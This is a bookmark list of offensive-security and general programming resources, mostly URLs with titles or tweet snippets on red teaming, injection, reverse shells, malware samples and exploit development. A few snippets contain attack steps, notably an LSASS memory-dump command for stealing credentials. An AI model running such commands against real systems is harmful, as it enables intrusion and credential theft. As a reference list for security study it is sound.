+https://twitter.com/laughing_mantis/status/1278497214076092416,“Gather round #infosec fam  Warning: This is a long Thread with lots of #VBALostArts & new goodies f
+https://twitter.com/lordsaibat/status/1218175513342234625,“Story time: I had a pentest this week  in a locked down environment. It was a RDP like session. The
+https://twitter.com/matterpreter/status/1218290309500669952,“Want to make service removal really fun? Create a service with a unicode name. The service will run
+https://twitter.com/mik317_/status/1272266731973722112,“#bugbountytips   Tips from @Jhaddix on @NahamSec Con:   * Get acquisitions: https://t.co/Nmigaahd2Y
+https://twitter.com/mrtuxracer/status/1238155252077117441,“During my interview with @NahamSec I've shared a very handy #BugBountyTip for wide-scope #BugBounty
+https://twitter.com/mysmartlogon/status/1279345159969353728,“Time to tell you a secret: your SIM/bank card are cheap javacards (1$ each). On such cards  you can
+https://twitter.com/ngkogkos/status/1193597560491008001,“Sometimes login endpoints submit the password twice in POST data. If you need to perform a credenti
+https://twitter.com/nicolebeckwith/status/1226563628754665478,“Where are my social engineers at? If you could give one piece of advice to employees about what to 
+https://twitter.com/ninjaparanoid/status/1265187842889744384,“#PROTIP: If you can't listen on port 80 during a bind shell  try adding the URI '/Temporary_Listen_
+https://twitter.com/pry0cc/status/1276671194713001985,“Hey you    If you want to upgrade your cat  try bat.  alias cat="bat --style=grid"  It does automat
+https://twitter.com/pyrotek3/status/1219302579483676672,“Microsoft recently released an installable Exchange Online PowerShell Module!  Install-Module Excha
+https://twitter.com/r2gui/status/1208106040954359808,“Cutter v1.10 now has a DEBUGGER! 🐞🥳 After a lot of work  we are so happy to announce that we finall
+https://twitter.com/s0md3v/status/1210130223334715393,“SSRF Break Points [1/2]  - Anything that accepts a URL - File upload option? Change type="file" to 
+https://twitter.com/s0md3v/status/1259014005697503232,“parallel processing in terminal - a thread  Find A records of domains saved in hosts.txt > parallel
+https://twitter.com/securethisnow/status/1207869808760344576,“Got the @GLiNetWiFi GL-MT300N v2 "Mango" and I didn't realize how small it is! I placed the SD card
+https://twitter.com/shantanukhande/status/1229348874298388484,“Dump LSASS with rundll32 rundll32.exe C:\Windows\System32\comsvcs.dll #24 "<PID> lsass.dmp full" ru
+https://twitter.com/shitsecure/status/1346321078113730560,“If someone of you tries to load a Nim binary from memory and fails this will most likely be do to m
+https://twitter.com/specterops/status/1339669728554577930,“All video and slide content from SO-CON 2020 has been posted to our website.  Check them out: https
+https://twitter.com/spidersec/status/1183784728245108736,“2FA Bypass Technique #bugbounty #bugbountytips”
+https://twitter.com/spidersec/status/1189937615115436032,“Testing SQLI  in Api's?   Always start From : Boolean based >> Time based  {"id":"56456"} - OK {"id
+https://twitter.com/sw33tlie/status/1275537548539027457,“Burp Suite > Proxy > Options > TLS Pass Through. Add these: .*\.google\.com  .*\.gstatic\.com .*\.m
+https://twitter.com/swiftonsecurity/status/1276277324913217536,“Another way to transfer files via RDP 3: 1.) Open pic.jpeg in Notepad++ 2.) select all 3.) Plugins 
+https://twitter.com/taksec/status/1224422773511995393,“XSS filter bypass using stripped </p> tag to obfuscate.  P2 Stored XSS $1500 on a private bug bount
+https://twitter.com/taksec/status/1245912365826068480,“Subdomain Takeover via unclaimed domain (P2)  https://t.co/0B2G9JsKxn CNAME https://t.co/GcWia8wVaW
+https://twitter.com/tifkin_/status/1243600743409397760,“Learned last night that there's a PE parser in System.Core.  Thanks to PowerShell's awesomeness  yo
+https://twitter.com/unknownuid/status/1262781677841059847,“@strandjs Python-based Bloodhound-collector (doesn’t collect GPOs): https://t.co/fhxndiuMFm  https:
+https://twitter.com/unknownuser1806/status/1251033789012168704,“#bugbounty Tools inception https://t.co/5v6dVa30Vz ohmybackup https://t.co/M89dcf7EVO shuffledns ht
+https://twitter.com/voulnet/status/1229031352596672513,“Here's a command injection WAF bypass that works:  using empty shell variables  like ${something} a
+https://twitter.com/vxunderground/status/1345156201915494400,“Join #virus on https://t.co/khLw7Ooqyn.   This IRC channel has been alive/around since approx. 1995
+https://twitter.com/waleedassar/status/1271045532933328896,“NtCreateEnclave arbitrary kernel address write.”
+https://twitter.com/williballenthin/status/1188146024486850565,“Saw a cool anti-analysis trick for JS this week:   If the source has been prettified  bail out.   P
+https://twitter.com/xdavidhu/status/1188130303472295936,“epic "one-liner": brute force unique  parameter-less paths from wayback machine with gobuster #bugb
+https://twitter.com/zseano/status/1221487298950455299,“GET /example?param=test .. nothing interesting happened  not vuln to XSS. (<> " was filtered)   but
+https://twitter.com/zseano/status/1258808193293172736,“<base href=//site.com> is rarely filtered yet allows you to change all relative urls to an URL you 
+https://vimeo.com/47978442,Defcon 20 - Owning One to Rule Them All
+https://vincentyiu.com/red-team-tips,Red Team Tips
+https://vuejs.org/v2/guide/,Vue.js - The Progressive JavaScript Framework
+https://vx-underground.org/,Amazing Malware sample and source code resource
+https://weakpass.com/wordlist,wordlists  weakpass  bruteforce  password list
+https://webassembly-security.com/fuzzing-wasm-javascript-dharma-chrome-v8/,Blogpost about Fuzzing JavaScript WebAssembly APIs using Dharma/Domato on Chrome/v8 by Patrick Ventu
+https://wiki.skullsecurity.org/Assembly,Assembly Language Tutorial. Please choose a tutorial page: Fundamentals -- Information about C; Tool
+https://windows-internals.com/printdemon-cve-2020-1048/,We promised you there would be a Part 1 to FaxHell   and with today's Patch Tuesday and CVE-2020-104
+https://winternl.com/fuzzing-the-windows-api-for-av-evasion/,What is emulation? Malware Detection Systems (MDSs) use a technique called emulation as perhaps thei
+https://wordlists.assetnote.io/,Welcome to Assetnote Wordlists. When performing security testing against an asset  it is vital to ha
+https://wulymammoth.github.io/posts/shell-shock/,Ever wonder if there are ways to be more efficient in our terminal and shell? Feeling a little clunk
+https://www.aliexpress.com/item/4000357298489.html,WHID Elite: GSM-enabled Open-Source Multi-Purpose Offensive Device
+https://www.askapache.com/htaccess/crazy-advanced-mod_rewrite-tutorial/,Htaccess Mod_Rewrite – Crazy Advanced Master Class
+https://www.askapache.com/htaccess/mod_rewrite-variables-cheatsheet/,Mod_Rewrite Variables Cheatsheet
+https://www.bantamtools.com/,Bantam Tools makes desktop CNC milling machines with professional reliability and precision at an af
+https://www.bc-security.org/post/reflective-pe-injection-in-windows-10-1909/,Reflective PE Injection in Windows 10 1909
+https://www.begin.re/,With Reverse Engineering for Beginners you will learn the basics of x86 and get hands-on experience 
+https://www.blackarrow.net/disable-functions-bypasses-and-php-exploitation/,Article about how disable_functions works in PHP and how to find bypasses
+https://www.blackhillsinfosec.com/a-pentesters-voyage-the-first-few-hours/,A Pentester’s Voyage – The First Few Hours
+https://www.blackhillsinfosec.com/deploying-a-webdav-server/,Deploying a WebDAV Server
+https://www.blackhillsinfosec.com/red-teamers-cookbook-byoi-bring-your-own-interpreter/,Red Teamer’s Cookbook: BYOI (Bring Your Own Interpreter)
+https://www.blackhillsinfosec.com/using-cloudfront-to-relay-cobalt-strike-traffic/,Using CloudFront to Relay Cobalt Strike Traffic (Domain Fronting)
+https://www.bleepingcomputer.com/forums/t/607369/which-file-types-do-common-ransomwares-target/,Which file types do common ransomwares target? - posted in Ransomware Help & Tech Support: Which fil
+https://www.bristol.ac.uk/news/2019/december/quantum-teleportation.html,First chip-to-chip quantum teleportation harnessing silicon photonic chip fabrication
+https://www.certego.net/en/news/advanced-vba-macros/,Advanced VBA macros: bypassing olevba static analyses with 0 hits
+https://www.christophertruncer.com/tag/beacon/,Receiving Text Messages for your Incoming Beacons
+https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/7910-11-7910.html,Moving Files and Images Between a Router and TFTP Server via SNMP
+https://www.coalfire.com/The-Coalfire-Blog/May-2020/The-Basics-of-Exploit-Development-3-Egg-Hunters,The Basics of Exploit Development 3: Egg Hunters
+https://www.cobaltstrike.com/help-malleable-c2,C2 Profile Help page  Cobalt Strike
+https://www.cobaltstrike.com/help-malleable-postex,Malleable PE, Process Injection, and Post Exploitation
+https://www.codeproject.com/Articles/4610/Three-Ways-to-Inject-Your-Code-into-Another-Proces,How to inject code into another processes address space  and then execute it in the context of this 
+https://www.codeproject.com/Articles/607352/Injecting-NET-Assemblies-Into-Unmanaged-Processes,A detailed analysis of how to inject the .NET runtime and arbitrary .NET assemblies into unmanaged a
+https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump,Get-all-shellcode-on-binary-file-from-objdump
+https://www.corelan.be/,Corelan Cyber Security Research Exploit Development Tutorials
+https://www.crummie5.club/freshycalls/,FreshyCalls is a library that tries to make the use of syscalls comfortable and simple  without gene
+https://www.cyberciti.biz/tips/linux-find-out-wireless-network-speed-signal-strength.html,8 Linux Commands: To Find Out Wireless Network Speed, Signal Strength And Other Information
+https://www.cybereason.com/blog/windows-icon-display-bug,A zebra in sheep's clothing: How a Microsoft icon-display bug in Windows allows attackers to masquerade PE files with special icons
+https://www.cyberstudents.org/blog-post/build-your-own-lab/,BUILD YOUR OWN LAB
+https://www.d00rt.eus/2020/04/ebfuscation-abusing-system-errors-for.html,Introduction  In this post I'm going to try to explain a new obfuscation technique I've come up with
+https://www.devdungeon.com/content/packet-capture-injection-and-analysis-gopacket,The gopacket package provides a Go wrapper for libpcap written in C. It is more than just a simple w
+https://www.devdungeon.com/content/working-files-go,Working with Files in Go
+https://www.digitalocean.com/community/tutorials/iptables-essentials-common-firewall-rules-and-commands,Iptables Essentials: Common Firewall Rules and Commands
+https://www.docdroid.net/zokUC70/android-ssl-pinning-pdf,Android-ssl-pinning
+https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process,Ten process injection techniques: A technical survey of common and trending process injection techniques
+https://www.ethicalhacker.net/features/root/wmi-101-for-pentesters/,WMI 101 for Pentesters
+https://www.exefiles.com/en/extensions/dll/all-files/,Listing of all files with DLL file extension (Dynamic Link Library)
+https://www.exploit-db.com/shellcodes?platform=windows_x86,Windows x86 shell code
+https://www.faqforge.com/windows/windows-10/how-to-disable-all-of-the-built-in-windows-10-ads/,How to disable all of the built-in Windows 10 ads
+https://www.fireeye.com/blog/threat-research/2020/09/fuzzing-image-parsing-in-windows-color-profiles.html,Fuzzing Image Parsing in Windows, Part One: Color Profiles
+https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html,We have discovered a global intrusion campaign  and we are tracking the actors behind this campaign 
+https://www.forrest-orr.net/post/a-modern-exploration-of-windows-memory-corruption-exploits-part-i-stack-overflows,A Modern Exploration of Windows Memory Corruption Exploits - Part I: Stack Overflows  Updated: Dec 5, 2020
+https://www.fortinet.com/blog/threat-research/the-case-studies-of-microsoft-windows-remote-procedure-call-serv,RPC Bug Hunting Case Studies – Part 1
+https://www.freecodecamp.org/news/massive-tensorflow-2-0-free-course/,TensorFlow is one of the most popular machine learning platforms—and it's completely open source. Wi
+https://www.frida.re/,Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.
+https://www.hackers-arise.com/post/2017/03/31/maltego-4-part-2-reconnaissance-on-a-person-boris-epshteyn,Reconnaissance is crucial for successful hacking/pentesting. Maltego is a unique tool for finding da
+https://www.hackingarticles.in/burpsuite-for-pentester-fuzzing-via-intruder-tab/,Burp Suite for Pentester – Fuzzing with Intruder (Part 1)
+https://www.hackingarticles.in/post-exploitation-using-wmic-system-command/,Post Exploitation Using WMIC (System Command)
+https://www.hackingarticles.in/windows-kernel-exploit-privilege-escalation/,Windows Kernel Exploit Privilege Escalation
+https://www.hexacorn.com/blog/2019/05/26/plata-o-plomo-code-injections-execution-tricks/,‘Plata o plomo’ code injections/execution tricks
+https://www.hexacorn.com/blog/2020/08/30/certulitis-one-tool-that-keeps-on-giving/,Certutil is a really naughty tool. It accepts lots of various command line arguments that I believe 
+https://www.hexacorn.com/blog/2021/01/03/amusingnotification/,Have you ever got annoyed by this popup? aMus(ing)Notification
+https://www.infosecmatter.com/minimalistic-tcp-and-udp-port-scanner/,Minimalistic TCP / UDP port scanner written in pure PowerShell for restricted environments. It will 
+https://www.infosecmatter.com/powershell-commands-for-pentesters/,A collection of 25+ PowerShell commands for pentesters and red teamers - finding sensitive informati
+https://www.infosecmatter.com/terminal-escape-injection/,Terminal escape injection vulnerability (ANSI/VT escapse sequences) can result into arbitrary comman
+https://www.infosecmatter.com/top-16-active-directory-vulnerabilities/,List of 16 common Active Directory vulnerabilities found during penetration tests with detailed comm
+https://www.i-programmer.info/news/90-tools/13536-google-launches-fuzzer-benchmarking-service.html,Programming book reviews  programming tutorials programming news  C#  Ruby  Python C  C++  PHP  Visu
+https://www.ired.team/offensive-security/code-execution/executing-code-in-control-panel-item-through-an-exported-cplapplet-function,Executing Code as a Control Panel Item through an Exported Cplapplet Function
+https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber,Shellcode Execution through Fibers
+https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c,Writing and Compiling Shellcode in C
+https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence,DLL Proxying for Persistence
+https://www.irongeek.com/homoglyph-attack-generator.php,Homoglyph-attack-generator
+https://www.jonbottarini.com/2019/06/17/using-burp-suite-match-and-replace-settings-to-escalate-your-user-privileges-and-find-hidden-features/,Using Burp Suite match and replace settings to escalate your user privileges and find hidden features
+https://www.malwarearchaeology.com/cheat-sheets,"Windows logging Cheat Sheet"  "Splunk Logging Cheat Sheet"
+https://www.mdsec.co.uk/2018/10/cisco-amp-bypassing-self-protection/,Cisco AMP – Bypassing Self-Protection. 26/10/2018 | Author: Adam Chester. Cisco AMP – Bypassing Self
+https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/,A Case Study in Modern EDRs
+https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/,RdpThief: Extracting Clear-text Credentials from Remote Desktop Clients. 13/11/2019 | Author: Admin.
+https://www.mdsec.co.uk/2020/04/designing-the-adversary-simulation-lab/,Designing The Adversary Simulation Lab
+https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/,FireWalker: A New Approach to Generically Bypass User-Space EDR Hooking
+https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-2-dcom/,I Like to Move It: Windows Lateral Movement Part 2 – DCOM
+https://www.mdsec.co.uk/2020/10/i-live-to-move-it-windows-lateral-movement-part-3-dll-hijacking/,I Like to Move It: Windows Lateral Movement Part 3: DLL Hijacking
+https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/,A Fresh Outlook on Mail Based Persistence
+https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/,Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams
+https://www.n00py.io/2020/01/managing-active-directory-groups-from-linux/,Managing Active Directory groups from Linux
+https://www.offensive-security.com/offsec/attacking-the-web-offsec-way/,Attacking the Web: The Offensive Security Way
+https://www.offensive-security.com/offsec/kernel-debugging-macos-with-sip/,Kernel Debugging macOS with SIP
+https://www.offensive-security.com/offsec/web-application-security-fundamentals/,Understanding the Fundamentals of Web Application Security
+https://www.oreilly.com/openbook/samba/book/ch05_03.html,5.3 File Permissions and Attributes on MS-DOS and Unix. DOS was never intended to be a multiuser  ne
+https://www.pentestpartners.com/security-blog/how-to-do-firmware-analysis-tools-tips-and-tricks/,How To Do Firmware Analysis. Tools Tips and Tricks
+https://www.pinvoke.net/default.aspx/,PInvoke.net is primarily a wiki, allowing developers to find, edit and add PInvoke* signatures, user-defined types, and any other information 
+https://www.purehacking.com/blog/lloyd-simon/an-introduction-to-use-after-free-vulnerabilities,Use After Free (UAF) vulnerabilities are a class of memory corruption bug that have been very succes
+https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/,Analyzing Cobalt Strike for Fun and Profit
+https://www.reddit.com/r/purpleteamsec/comments/hbdvz4/red_team_techniques_june_2020/,Red Team Techniques - June 2020
+https://www.reddit.com/r/redteamsec/comments/itixr7/what_c2_platform_have_you_had_success_with/,What C2 platform have you had success with?
+https://www.reddit.com/r/techsupport/comments/gqb915/i_wrote_task_manager_and_i_just_remembered/,I wrote Task Manager and I just remembered something…
+https://www.ryanpickren.com/webcam-hacking,The story of how I gained unauthorized Camera access on iOS and macOS 
+https://www.scorpiones.io/articles/lateral-movement-using-dcom-objects,Lateral movement DCOM
+https://www.scriptjunkie.us/2013/03/saving-shells-with-prependmigrate/,Saving shells with PrependMigrate
+https://www.scriptjunkie.us/2018/07/windows-10-decontamination-scripts/,Windows 10 Decontamination Scripts
+https://wwws.nightwatchcybersecurity.com/2020/06/14/yaa-an-obscure-macos-compressed-file-format/,YAA: An Obscure MacOS Compressed File Format
+https://www.thezdi.com/blog/2020/2/6/mindshare-dealing-with-encrypted-router-firmware,MindShaRE: Dealing with encrypted router firmware 
+https://www.threatmodelingmanifesto.org/,Threat Modeling Manifesto
+https://www.toshellandback.com/2017/08/16/mousejack/,Hostile Airwaves: Mousejacking On internal engagements  poisoning name resolution requests on the lo
+https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/,Abusing Windows Telemetry for Persistence
+https://www.trustedsec.com/blog/a-developers-introduction-to-beacon-object-files/,Intro To BOF Cobalt Strike
+https://www.trustedsec.com/blog/azure-account-hijacking-using-mimikatzs-lsadumpsetntlm/,Azure Account Hijacking using mimikatz’s lsadump::setntlm
+https://www.trustedsec.com/blog/how-to-set-up-a-quick-simple-webdav-server-for-remote-file-sharing/,How to Set Up a Quick Simple WebDAV Server for Remote File Sharing
+https://www.trustedsec.com/blog/introducing-proxy-helper-a-new-wifi-pineapple-module/,Introducing Proxy Helper – A New WiFi Pineapple Module
+https://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/,Malicious Macros for Script Kiddies
+https://www.trustedsec.com/blog/red-teaming-with-cobalt-strike-not-so-obvious-features/,Red Teaming With Cobalt Strike – Not So Obvious Features
+https://www.trustedsec.com/blog/the-tale-of-the-lost-but-not-forgotten-undocumented-netsync-part-1/,The Tale of the Lost but not Forgotten Undocumented NetSync Part 1
+https://www.trustedsec.com/blog/the-vba-language-for-script-kiddies/,The VBA Language for Script Kiddies
+https://www.trustedsec.com/blog/weaponizing-group-policy-objects-access/,Weaponizing Group Policy Objects Access
+https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/unc-path-injection-with-microsoft-access/,UNC Path Injection with Microsoft Access
+https://www.tutorialspoint.com/assembly_programming/assembly_registers.htm,Assembly – Registers
+https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows,DLL Hijacking is a popular technique for executing malicious payloads. This post lists nearly 300 ex
+https://www.winsocketdotnetworkprogramming.com/winsock2programming/winsock2advancednamedpipe15.html,This tutorial discusses the Windows network name pipe from the programming aspects which covers the 
+https://www.youtube.com/channel/UCEQXp_fcqwPcqrzNtWJ1w9w,Weekly Inkscape and GIMP tutorials. I'm Nick and I've been a freelance graphic designer since 2011  
+https://www.youtube.com/channel/UCJ2U9Dq9NckqHMbcUupgF0A,Black Hills Channel
+https://www.youtube.com/watch?v=0uejy9aCNbI,URLs are surprisingly hard to read. Chrome Bug: https://bugs.chromium.org/p/chromium/issues/detail?i
+https://www.youtube.com/watch?v=B9wOfeFtjXk,Learn about attacks that compromise SSO (Single Sign-On) systems and how you can protect against the
+https://www.youtube.com/watch?v=gfYswA_Ronw,This video demonstrates the Beacon Object File feature introduced in Cobalt Strike 4.1. https://www.
+https://www.youtube.com/watch?v=_HvqI3Bsgfs,In this video  I will show you all how to reverse engineering .NET applications with dnspy. This vid
+https://www.youtube.com/watch?v=IDSZVhvLznY,Vibing Your Way Through an Enterprise – How Attackers are Becoming More Sneaky Traditional defenses 
+https://www.youtube.com/watch?v=iJFnYBJJiuQ,In this video we use SIMtrace to intercept the communication between the phone and SIM card to under
+https://www.youtube.com/watch?v=ix5yZm4fwFQ,In this video we hack the GameBoy cartridge protection by building our own GameBoy cartridge using a
+https://www.youtube.com/watch?v=q7VQeK533zI&list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no,Red Team Ops with Cobalt Strike (1 of 9): Operations
+https://www.youtube.com/watch?v=ru5VzUigKqw,In this video we take a quick look at the encryption component of WannaCry! We also check out how th
+https://www.youtube.com/watch?v=t-t7D0vQNmo,Here is a short stream  we just explain the exploit we wrote and rant a bit about random things.
+https://www.youtube.com/watch?v=uD87fLN1zPU,I'm a bug bounty hunter who's learning everyday and sharing useful resources as I move along. Subscr
+https://www.youtube.com/watch?v=uyUb0pNZZSg,One of the most heavily used tools in reverse engineering any device is a multimeter. But meters hav
+https://www.youtube.com/watch?v=wwXRhpw7ih0,Build the server-side AgentController and CoreServerModule to handle agent checkin.
+https://www.zdnet.com/article/hackers-exploit-windows-error-reporting-service-in-new-fileless-attack/,The Kraken attack technique abuses WER to avoid detection.
+https://www.zdnet.com/article/openssh-adds-support-for-fidou2f-security-keys/,OpenSSH 8.2 adds support for authentication via FIDO/U2F protocols  most commonly used with hardware
+https://xcellerator.github.io/posts/linux_rootkits_09/,Linux Root Kits
+https://yesteapea.wordpress.com/2013/03/03/counting-the-number-of-set-bits-in-an-integer/,Counting the number of set bits in an integer
+https://zero2auto.com/2020/06/22/unpacking-visual-basic-packers/,Unpacking Visual Basic Packers – IcedID
+https://zeroaptitude.com/zerodetail/fuzzing-with-boofuzz/,Boofuzz – A helpful guide (OSCE – CTP)
+https://z-r0crypt.github.io/blog/2020/01/22/oswe/awae-preparation/,OSWE Exam Preparation This post contains all trainings and tutorials that could be useful for offens
+http://threatexpress.com/blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/,A Deep Dive into Cobalt Strike Malleable C2
+http://williamknowles.io/living-dangerously-with-module-stomping-leveraging-code-coverage-analysis-for-injecting-into-legitimately-loaded-dlls/,“Module stomping” is an approach to hiding malicious code in a process' memory  and having it appear
+http://windbg.info/doc/1-common-cmds.html,Common WinDbg Commands (Thematically Grouped)  by Robert Kuster.
+http://www.datypic.com/sc/ooxml/e-w_r-2.html,Element information
+http://www.fuzzysecurity.com/tutorials/expDev/6.html,Part 6: Writing W32 shellcode. Hello and welcome! Today we will be writing our own shellcode from sc
+http://www.hexacorn.com/blog/2018/03/15/beyond-good-ol-run-key-part-73/,If you have a dvdplay.exe program on your system you can quickly do two things with it: use it to di
+http://www.irongeek.com/i.php?page=videos/derbycon9/mainlist,Derby Con Videos
+http://www.missoumsai.com/google-csrfs.html,Research: The mass CSRFing of *.google.com/* products. 
+http://www.rohitab.com/apimonitor,API Monitor is a software that monitors and displays API calls made by applications and services. It
+http://www.rohitab.com/discuss/,Programming resource
+http://www.rvrsh3ll.net/blog/offensive/ssl-domain-fronting-101/,If you’re new to the domain fronting concept  I suggest you start by reading Simplifying Domain Fron
+http://www.tarasco.org/security/named_pipes/,Named pipes network impersonation proof of concept tool
+http://www.unixwiz.net/techtips/x86-jumps.html,Intel x86 JUMP quick reference
+http://www.useragentstring.com/pages/useragentstring.php,List of User Agent Strings
+http://www.youtube.com/playlist?list=PL6lxxT7IdTxGXX6D6j-zjzcgoOD8WYMS2,Gives an overview of machine code and the fetch - decode - execute cycle
+http://www.youtube.com/playlist?list=PL8j1j35M7wtKXpTBE6V1RlN_pBZ4StKZw,In this playlist  we are going over every single challenge of OWASP's juice shop together. This is a
+http://www.youtube.com/playlist?list=PLKK11Ligqitg9MOX3-0tFT1Rmh3uJp7kA,Assembly Language Playlist
+http://www.youtube.com/playlist?list=PLzzz0pYwY0M1GHFr8zmN3_6U4CZ-j8hUb,Hacking Competition
+http://htmlpurifier.org/live/smoketests/xssAttacks.xml,XSS Fuzzing Wordlist
+https://github.com/payloadbox/xss-payload-list,XSS Payloads With Some Filter bypass
+https://alvinalexander.com/unix/edu/examples/grep.shtml,Grep Resource
+https://ryanstutorials.net/linuxtutorial/cheatsheetgrep.php,Grep Cheat Sheet
+https://ryanstutorials.net/linuxtutorial/grep.php,Grep Reqular Expressions
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS,XSS Payloads
+https://gist.github.com/alkavan/746547,Useful Linux Commands
+https://askubuntu.com/questions/161935/how-do-i-log-all-input-and-output-in-a-terminal-session,Log Terminal input and output
+https://github.com/puppeteer/puppeteer,Puppeteer Library JS
+https://www.whitehatsec.com/blog/magic-hashes/,Magic Hashes
+http://ootips.org/mvc-pattern.html,Understanding MVC
+http://heim.ifi.uio.no/~trygver/themes/mvc/mvc-index.html,Understanding MVC2
+https://developer.apple.com/library/archive/documentation/General/Conceptual/DevPedia-CocoaCore/MVC.html,Understanding MVC3
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/,Upgrade Simple Shell To full TTY
+https://jinja.palletsprojects.com/en/2.11.x/templates/, Jinja Documentation
+https://gracefulsecurity.com/xxe-xml-external-entity-injection/,XXE Reference
+https://portswigger.net/web-security/xxe/xml-entities,Guide to XML entities
+https://www.epochconverter.com/,EPOCH Time Converter
+http://www.hsqldb.org/doc/2.0/guide/running-chapt.html#rgc_security,HSQLDB security
+http://hsqldb.org/doc/2.0/util-guide/dbm-chapt.html,HSQLDB connection
+http://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_routines,Java Language Routines
+https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html,Java System Propertys
+https://docs.oracle.com/javase/7/docs/api/java/lang/System.html#getProperty(java.lang.String),Java getProperty function
+https://sqlite.org/doclist.html,SQLite Documentation
+https://jsonformatter.org/json-escape,JSON data online escaper
+https://pypi.org/project/python-pypi-mirror/,python package mirror
+https://realpython.com/primer-on-python-decorators/#functions,Understanding Python Function Decorators
+https://book.hacktricks.xyz/pentesting-web/command-injection,Web Command Injection
+https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti,Template Injection Cheatsheet
+https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee,Flask/Jinja Injections
+https://realpython.com/python-itertools/,Library That Gens Every Possible Combo
+https://www.rexegg.com/regex-quickstart.html,Regex Resource
+https://www.rexegg.com/regex-quantifiers.html,Regex Quantifiers
+https://regex101.com/,Regex String Tester
+https://www.postgresql.org/docs/9.2/sql-syntax-lexical.html,Lexical Syntax PSQL
+https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5,Code Execution in 9.3 - Latest PSQL
+https://www.onsecurity.io/blog/pentesting-postgresql-with-sql-injections/,Pentesting Postgresql
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-blind,Postgresql Injections
+https://github.com/noraj/vbsmin,VBSMin Tool Make any VBS a one-liner(so it can be used with sql copy_to() function)
+https://github.com/Dionach/pgexec/blob/master/pg_exec.c,PG_EXEC FUNCTION UDF(UserDefinedFunction)
+https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed,Postgresql UDF(UserDefinedFunction) attack
+https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html,Windows Postgresql UDF(UserDefinedFunction) attack
+https://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt,Postgresql Hacking Research
+https://www.unix-ninja.com/p/postgresql_for_red_teams,POSTGRES UDF 2
+https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql,POSTGRES LARGE OBJECT HACKS
+https://github.com/danielmiessler/SecLists,SecList Github
+https://github.com/fuzzdb-project/fuzzdb,FuzzDB Github
+https://github.com/nice-registry, Nice-Registry Github NPM tools and DataSets
+https://caolan.github.io/async/v3/,Understand async processing
+https://www.wispwisp.com/?p=559,NodeJs Hacks 1
+https://github.com/patriksimek/vm2/issues/32,Escaping NodeJs VM Sandbox
+https://hapi.dev/tutorials/gettingstarted/?lang=en_US,HAPI NodeJS Framework
+https://www.w3schools.com/jsref/jsref_obj_regexp.asp,Javascript RegExp Reference
+https://www.w3schools.com/jsref/jsref_replace.asp,Javascript String Replace
+https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/,NodeJS RCE simple Reverse Shell
+https://www.blackhillsinfosec.com/how-to-hack-websockets-and-socket-io/,NodeJS WebSockets and socket.io
+https://sequelize.org/master/index.html,Sequelize Documentation
+https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44,NodeJs RevShell and Tutorial
+https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html,NodeJs Sandbox Bypass
+https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/,Windows Reverse Shell One Liners
+https://www.binarytides.com/winsock-socket-programming-tutorial/,C WinSock Programming Tutorial
+https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/projection-operations,Projection Operations (sqlish selection inside c#)
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md,Reverse Shell One Liners
+https://github.com/infoskirmish/Window-Tools/blob/master/Simple%20Reverse%20Shell/shell.c,Simple C Reverse Shell
+https://dev.mysql.com/doc/,Mysql Documentation
+https://www.obrela.com/using-udf-penetration-testing/ ,Using UDF in Penetration Testing
+http://www.mysqludf.org/lib_mysqludf_sys/index.php, Creating MYSQL UDF (UserDefinedFunction)
+https://database.guide/what-is-collation-in-databases/,SQL What is Collation in Database
+https://mariadb.com/kb/en/setting-character-sets-and-collations/,MariaDB Collation
+https://mariadb.com/kb/en/information-schema-collations-table/, Getting Collations
+http://www.edwardl.xyz/2015/02/06/SQL%20Injections%20in%20MySQL%20LIMIT%20clause/,SQL Injection into Limit clause
+http://httpd.apache.org/docs/current/howto/ssi.html,Server Side Include Hacks
